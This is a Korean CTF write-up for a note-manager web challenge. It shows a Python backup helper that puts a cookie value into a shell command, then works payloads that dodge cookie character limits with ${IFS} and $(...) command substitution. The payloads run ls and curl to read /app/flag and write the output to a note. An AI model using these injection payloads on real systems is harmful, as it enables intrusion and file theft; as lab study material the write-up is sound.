---
title: "Simple Note Manager(DH, B2)"
date: 2026-07-06
draft: false
tags: ["Command Injection"]
ShowToc: true
---

## 고정 순서 (풀이 프로토콜)

0. 목표 좌표 (Objective)
flag 위치·조건. 도착지를 못 찍으면 공격 표면 전체를 헤맴. 끝점부터 역산.

1. 공격 표면 (Attack Surface)
통제 가능한 입력 전부. `endpoint × {query, body, header, cookie} × 인증여부`. 빠뜨린 입력 = 못 보는 공격로. 쿠키·헤더 빼먹는 게 초보 함정.

2. Source → Sink 추적 (Dataflow)
각 입력이 도달하는 위험 연산. 컨트롤러에서 멈추지 말고 헬퍼 끝까지. Sink 리스트 암기: `subprocess/os.system`, `eval/exec`, `open`, `pickle.loads`, SQL 문자열, `render_template_string`, 파일경로 조합.

3. 신뢰 경계 + 가설 (Trust & Hypotheses)
어떤 신뢰를 깨야 목표에 닿나. 후보 나열 + `가능성 × 목표근접도`로 우선순위. 가짜 검증 감별: `isinstance(x, str)`는 방어가 아니라 연극. 타입 검증 ≠ 내용 검증.

4. 최소 검증 (PoC Atom)
가장 유망한 가설을 관측 가능한 최소 단위로 확인. 한 번에 최종 페이로드 쏘지 말 것. "코드가 실행되긴 하나"부터. 실패 시 다음 후보.

5. 체인 (Chain)
단일로 미달이면 조각을 엮음. blind면 익스 전에 관측 채널부터 확보. 안 보이면 성공해도 성공한 줄 모름.

## 공격 표면

| endpoint | method | 통제 입력 | 비고 |
|---|---|---|---|
| /create_note | POST | content (form) | 노트 생성 |
| /update_note | POST | note_id, content (form) | 수정 |
| /delete_note | POST | note_id (form) | 삭제 |
| /backup_notes | POST | backup-timestamp (cookie) ← 급소 | 백업 → sink |

## 취약점

```python
def backup_notes(timestamp):
    with lock:
        with open('./tmp/notes.tmp', 'w') as f:
            f.write(repr(notes))
        subprocess.Popen(f'cp ./tmp/notes.tmp /tmp/{timestamp}', shell=True)
```

`timestamp`는 `backup-timestamp` 쿠키에서 옴(`request.cookies.get`). 쿠키 = 클라이언트 100% 통제. `shell=True` 셸 문자열에 f-string으로 그대로 박힘 → OS Command Injection.

컨트롤러 `post_backup_notes`만 보면 안 보임. 헬퍼까지 내려가야 sink 노출.

가짜 검증: `if not isinstance(backup_timestamp, str): abort(400)` — 쿠키 값은 원래 무조건 문자열 → 안 걸림. `; cat /flag`도 완벽한 문자열. 타입 검증 ≠ 내용 검증.

## 익스플로잇

### 통로 제약 → 우회
페이로드가 쿠키로 들어감. 쿠키 금지 문자:

| 쓰고 싶은 것 | 막히는 이유 | 우회 |
|---|---|---|
| ` ` 공백 (인자 구분) | 쿠키 값 파싱 종료 | `${IFS}` |
| `;` `&&` (명령 구분) | `;`는 쿠키 간 구분자 → 값 잘림 | `$(...)` 명령 치환 |

→ 정상형 `; curl ...` 을 `$(curl${IFS}...)` 로 재작성.

### 관측 채널 (blind 처리)
sink = `subprocess.Popen` = non-blocking. 자식을 안 기다리고 즉시 리턴 → 결과가 HTTP 응답에 안 실림 + `$(sleep 5)` timing 탐지도 죽음.
→ 유일 채널 = self-exfiltration. 주입한 curl로 서버가 자기 자신의 `/create_note` 호출 → 출력을 노트로 저장 → 브라우저로 읽음.

### 전제조건
`if len(notes) == 0: abort(404)` → 노트 1개 먼저 생성.

### 과정
1. 노트 1개 생성 (`POST /create_note`, content=아무거나) — 전제조건 해제.
2. 내부 포트 확인 — 내부 ≠ 외부(18871). 관례 후보(5000/8000)를 마커로 탐색:
   ```
   backup-timestamp=1234$(curl${IFS}-d${IFS}content=P5000${IFS}http://127.0.0.1:5000/create_note)
   ```
   → `P5000` 노트 생성 = 내부 포트 5000 확정.
3. 경로 확인 — `/flag` 가정 실패. `ls`로 검증:
   ```
   1234$(ls${IFS}-la${IFS}/|curl${IFS}--data-urlencode${IFS}content@-${IFS}http://127.0.0.1:5000/create_note)
   ```
   → 루트에 flag 없음, `/app` 발견 → `ls -la /app` → `/app/flag` 확정.
4. flag 읽기:
   ```
   1234$(curl${IFS}--data-urlencode${IFS}content@/app/flag${IFS}http://127.0.0.1:5000/create_note)
   ```
   → 노트에 flag 출력.

### 최종 페이로드 (Cookie 헤더)
```
Cookie: backup-timestamp=1234$(curl${IFS}--data-urlencode${IFS}content@/app/flag${IFS}http://127.0.0.1:5000/create_note)
```

## 삽질 & 교훈

- 내부 포트 ≠ 외부 포트. 18871은 내부에서 connection refused → blind라 무증상 실패. 내부 리스닝 포트(5000) 사용해야 함.
- 관례는 가정. `/flag` 찍고 실패 → curl은 파일 못 읽으면 요청 자체를 안 보냄 → blind로는 무신호. `ls`로 검증 필수.
- `find /`는 지뢰. `/proc`·`/sys` 훑느라 느려 파이프 소비자(curl)가 대기 → 결과 안 옴. 범위 좁힐 것.
- Popen non-blocking → timing 탐지 불가. sleep 판별 습관이 여기선 무용. sink가 blocking인지부터 확인.
- 한 변수씩 바꿔 실패 지점 좁히기. 채널(P5000) 확인 후엔 바뀐 변수가 경로뿐 → 범인이 경로로 자동 수렴.